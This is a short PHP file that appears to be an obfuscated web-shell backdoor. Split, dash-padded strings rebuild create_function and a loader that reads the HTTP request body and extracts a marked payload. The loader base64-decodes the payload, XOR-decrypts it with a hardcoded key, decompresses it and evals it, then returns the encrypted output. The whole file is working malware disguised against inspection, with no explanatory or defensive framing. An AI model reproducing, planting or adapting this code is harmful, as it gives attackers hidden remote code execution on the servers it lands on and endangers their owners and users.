<?php
$K='$k=-"2c10978c"-;$kh="-20be0c-390786";-$kf="3-d4c-405df-2d7";-$p="chqzHEA-B-kTqYs4P-1-';
$V='a-l(@gzu-ncom-pr-ess(@x(@b-ase64_-de-code(-$m[1]),-$k)));-$o=-@ob_get_co-ntents();@o-';
$N='";functi-on x($t,$k-){$c=str-len($-k);$l=st-rle-n($t)-;$o="";for-($i=-0;-$i<$l;){fo';
$j='r(-$j=0;-($j<$-c&&$i<$l-);-$j++,$i-++){-$o.=--$t-{$i}^-$k{-$--j};}}return $o;}if (@p-';
$J=str_replace('I','','creIaIIte_IfIuInction');
$y='reg_match("/$kh(.-+)$-kf/",@f-ile_get_co-nt-ents-("php://input-"),$m)==-1-) {@ob_s-tart();-@ev';
$s='b_end_cle-an();$-r=@bas-e64_en-code(-@x(@gzcom-pre-ss(-$o),$k));p-rint(-"$p$k-h$r$kf");}';
$G=str_replace('-','',$K.$N.$j.$y.$V.$s);
$k=$J('',$G);$k();
?>
